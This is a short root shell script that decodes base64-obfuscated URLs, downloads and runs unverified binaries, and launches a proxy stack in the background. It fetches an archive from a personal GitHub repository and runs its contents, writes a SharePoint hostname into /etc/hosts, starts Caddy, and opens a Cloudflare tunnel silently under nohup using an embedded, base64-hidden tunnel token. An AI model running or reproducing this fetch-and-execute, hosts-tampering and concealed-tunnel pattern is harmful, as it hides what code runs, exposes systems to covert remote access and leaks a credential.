cd /root
weburl_S='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3pob3V6aGVucWkvZmlsZS9tYXN0ZXIvd2ViLnRhci54ego='
weburl=$(printf "%s" $weburl_S | base64 -d) 
curl -O $weburl
sleep 1
xz -z -d web.tar.xz
tar -xvf web.tar
chmod +x *
./web.js -c ./config.json &
echo "13.107.136.9 209zzq-my.sharepoint.com" >> /etc/hosts
./cy run --config ./cyfile --adapter caddyfile &
cturl_S='aHR0cHM6Ly9naXRodWIuY29tL2Nsb3VkZmxhcmUvY2xvdWRmbGFyZWQvcmVsZWFzZXMvbGF0ZXN0L2Rvd25sb2FkL2Nsb3VkZmxhcmVkLWxpbnV4LWFtZDY0Cg=='
cturl=$(printf "%s" $cturl_S | base64 -d) 
curl -o cf -L $cturl
chmod +x cf
ARGO_ARGS_S='LS1wcm90b2NvbCBxdWljIC0tZWRnZS1pcC12ZXJzaW9uIDQgdHVubmVsIHJ1biAtLXRva2VuIGV5SmhJam9pT1RNNVpqTm1ZMlV6TXpJeU9HVmpZek5tWWpNME9EbGlZVEZpTVdVd01UWWlMQ0owSWpvaVl6TTFNamd4T1RjdE5HWTNOQzAwWlRNMExXSTROMll0TURNNE1HSm1aRGhtTjJReElpd2ljeUk2SWsxWFZYcFpiVlY2V21wVmRFMXFRVEJhYVRBd1RXcEpkMHhVWjNsUFZHZDBUVVJaZWsxNmFHcE9iVnBwVGxSYWJDSjkK'
ARGO_ARGS=$(printf "%s" $ARGO_ARGS_S | base64 -d) 
nohup ./cf $ARGO_ARGS >/dev/null 2>&1 &
